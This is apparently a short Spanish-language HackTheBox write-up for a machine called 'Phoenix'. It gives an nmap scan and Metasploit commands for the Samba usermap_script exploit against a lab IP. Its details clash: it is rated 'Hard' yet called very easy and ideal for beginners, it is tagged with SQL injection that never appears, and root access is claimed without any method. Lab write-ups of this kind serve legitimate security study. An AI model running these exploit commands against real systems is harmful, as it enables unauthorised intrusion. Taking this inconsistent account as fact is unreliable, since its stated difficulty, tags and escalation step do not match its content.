---
title: HTB - Phoenix
layout: writeup
date: 2026-04-13
dificultad: Hard
plataforma: HackTheBox
lang: es
---

# 🧠 HTB - Phoenix

## 🔍 Enumeración

Escaneo inicial:

```bash
nmap -sC -sV 10.10.10.3
```

### 📡 Servicios detectados

- FTP
- SSH
- Samba (⚠️ vulnerable)

---

## 💥 Explotación

Se detecta vulnerabilidad en Samba (`usermap_script`)

```bash
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
run
```

✔️ Acceso conseguido como usuario

---

## 🔐 Privilege Escalation

No es necesaria escalada compleja.

El sistema está mal configurado y permite acceso root directo.

---

## 🏁 Conclusión

Máquina muy sencilla:

- Ideal para principiantes  
- Introduce conceptos básicos de explotación  
- Buen primer contacto con HackTheBox  

---

## 🏷️ Tags

- #HTB  
- #Hard   
- #Sql
- #Sql-Injection
